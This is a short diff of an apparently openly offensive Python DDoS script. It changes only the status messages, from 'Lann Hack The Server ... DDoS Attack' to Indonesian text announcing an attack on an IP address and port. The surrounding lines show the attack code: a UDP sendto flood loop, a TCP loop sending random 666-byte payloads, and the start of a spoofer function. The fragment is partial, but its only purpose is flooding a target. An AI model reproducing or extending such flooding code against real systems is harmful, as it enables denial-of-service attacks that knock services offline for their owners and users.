@@ -212,9 +212,9 @@ def run():
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print(" 0xF1 Lann Hack The Server %s DDoS Attack %s"%(ip,port))
+			print(" 0xF1 Menyerang alamat ip %s dengan port %s"%(ip,port))
 		except:
-			print(" 0xF1 Lann Hack The Server %s DDoS Attack %s"%(ip,port))
+			print(" 0xF1 Menyerang alamat ip %s dengan port %s"%(ip,port))
 
 def tcp():
 	data = random._urandom(666)
@@ -227,7 +227,7 @@ def tcp():
 				s.send(data)
 		except:
 			s.close()
-			print("\033[1;31;40m 0xF1 Lann Hack The Server %s DDoS Attack  %s"%(ip,port))
+			print("\033[1;31;40m 0xF1 Menyerang alamat ip %s dengan port  %s"%(ip,port))
 
 def spoofer():
     addr = [192, 168, 0, 1]
